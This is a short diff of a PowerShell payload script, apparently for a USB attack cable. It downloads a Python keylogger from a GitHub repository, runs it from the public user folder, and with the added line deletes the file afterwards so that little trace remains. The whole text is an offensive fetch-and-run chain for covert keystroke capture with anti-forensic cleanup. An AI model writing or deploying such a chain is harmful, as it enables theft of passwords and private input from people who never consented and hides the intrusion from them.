@@ -10,3 +10,4 @@ $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";"
 wget "https://raw.githubusercontent.com/csandoval63/OMGCableStuff/master/Python%20keylogger%20stuff%20with%20DUCKYscript/python%20keylogger%20test.py" -outfile "pythonkl.py"
 $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
 python 'C:\Users\Public\pythonkl.py'
+Remove-Item 'C:\Users\Public\pythonkl.py'
